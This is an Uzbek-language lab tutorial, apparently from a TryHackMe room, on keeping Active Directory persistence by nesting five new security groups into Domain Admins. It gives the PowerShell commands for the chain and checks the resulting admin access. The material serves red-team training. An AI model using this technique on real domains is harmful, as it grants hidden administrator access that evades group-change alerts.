
### SID tarixlarini o‘zgartirmasdan AD guruhlariga qo‘shilish orqali barqarorlik (persistensiya)

Agar biz SID tarixlari bilan o'ynashni xohlamasak, o'zimizni to'g'ridan-to'g'ri Active Directory (AD) guruhlariga qo'shish orqali ham barqarorlikka erishishimiz mumkin. SID history ajoyib barqarorlik usuli bo‘lishiga qaramay, credential rotation (parollarni almashtirish) va tozalanish jarayoni bizning mavjudligimizni yo‘q qilishi mumkin. Ba'zi hollarda esa AD guruhlariga hujum qilish orqali barqarorlikni saqlab qolish yanada foydaliroq bo'lishi mumkin.

---

### Guruh a’zoligi orqali barqarorlik

1-topshiriqda aytib o’tilganidek, eng ko‘p huquqlarga ega hisob yoki guruh barqarorlik uchun har doim ham eng yaxshi variant emas. Aynan yuqori imtiyozli guruhlar faol nazorat ostida bo'ladi. Domain Admins yoki Enterprise Admins kabi **himoyalangan guruhlar**ga o'zgartirish kiritilishi qo'shimcha xavfsizlik nazorati ostida bo'ladi.

Shuning uchun barqarorlikni guruh orqali saqlamoqchi bo‘lsak, ba’zan biroz ijodkorlik talab qilinadi. Quyidagi guruhlar barqarorlik uchun foydali bo'lishi mumkin:

* **IT Support** guruhi — bu guruh a’zolari foydalanuvchilarning parollarini o‘zgartira olish kabi huquqlarga ega bo‘lishi mumkin. Bu huquqlar yordamida boshqa ishchi stansiyalarni egallash mumkin.
* **Mahalliy administrator huquqini beruvchi guruhlar** ko‘pincha himoyalangan guruhlar darajasida kuzatilmaydi. Bu guruhlar orqali domenni yana boshqarib olish mumkin.
* To‘g‘ridan-to‘g‘ri emas, **bilvosita huquqlar**ga ega guruhlar ham foydali. Masalan, Group Policy Objects (GPO) egasi bo‘lgan guruhlar.

---

### Ichma-ich guruhlar (Nested Groups)

Ko‘pgina tashkilotlarda guruhlar ichma-ich shaklda tashkil etiladi. Bu **rekursiv guruhlar** deb ataladi. Masalan, IT Support guruhida quyidagi kichik guruhlar bo‘lishi mumkin: **Helpdesk**, **Access Card Managers**, **Network Managers**.

Bu kichik guruhlar IT Support guruhiga a’zo qilinadi. Natijada ular IT Support’ga tegishli huquqlarga ega bo'lishadi, lekin o'zlariga xos huquqlari ham bo'ladi.

Bu struktura qulay bo‘lsa-da, **real ruxsatlar**ni ko‘rish va tahlil qilishni qiyinlashtiradi. Masalan, AD’ni so‘roqlaganda IT Support’da atigi 3 ta a’zo bor deb javob qaytadi. Lekin bu uchta kichik guruh. Har bir guruhni alohida tahlil qilish kerak. Kichik guruhlar o‘z navbatida boshqa kichik guruhlarga ham a’zo bo‘lishi mumkin. Natijada: **“Qancha darajagacha tahlil qilish kerak?”** degan savol tug‘iladi.

Bu monitoring muammolarini ham keltirib chiqaradi. Masalan, Domain Admins guruhiga yangi a’zo qo‘shilganida signal beradigan tizim mavjud bo‘lishi mumkin. Lekin **shu guruhga a’zo bo‘lgan kichik guruhga** a’zo qo‘shilsa, hech qanday signal berilmaydi.

---

### Ichma-ich guruhlardan foydalanib barqarorlikka erishish

Biz bu texnikani sinab ko‘rishimiz mumkin. **Avvalo**, “People -> IT” OU (Organisational Unit) ga yangi guruh yarating:

```powershell
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

Endi **“People -> Sales”** OU ichida yangi guruh yarating va yuqoridagi guruhni unga a’zo qiling:

```powershell
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
```

Bu amallarni davom ettiring (har safar avvalgi guruhni yangi guruhga a’zo qilib qo‘shing):

```powershell
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"

New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"

New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
```

**Oxirgi guruhni** Domain Admins guruhiga qo‘shamiz:

```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
```

Endi **oddiy foydalanuvchi hisobini** birinchi guruhga qo‘shamiz:

```powershell
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

---

### Tekshirish

SSH orqali `THMWRK1` mashinasida quyidagicha tekshirishingiz mumkin:

```powershell
dir \\thmdc.za.tryhackme.loc\c$\
```

Agar `C:\` diskdagi fayllar ro‘yxatini ko‘rsangiz, demak oddiy foydalanuvchingizda endi administratorlik huquqlari bor.

Domain Admins ichidagi a’zolarni ko‘rish orqali ham ishonch hosil qilamiz:

```powershell
Get-ADGroupMember -Identity "Domain Admins"
```

Bu yerda faqatgina **1 ta yangi a’zo** ko‘rsatiladi — bu biz yaratgan `Net Group 5`. Qolgan guruhlar esa unga ichma-ich tarzda a’zo bo‘lgan.

---

### Faqat “Blue Team”ni emas, AD tuzilmasining o‘zini ham qiynaymiz

Agar bu haqiqiy tashkilot bo‘lsa, biz yangi guruhlar yaratmasdik. Aksincha, mavjud guruhlar ichidan foydalanardik. Ammo bu amaliyot **real red team testlarida tavsiya etilmaydi**, chunki bu tashkilotning Active Directory strukturasi buzilishiga olib keladi. Bu darajada o‘zgarish qilinsa, **hatto sizni chiqarib yuborishsa ham**, tashkilot AD’ni **qaytadan yaratishga** majbur bo‘ladi — bu esa ulkan zararga olib keladi.
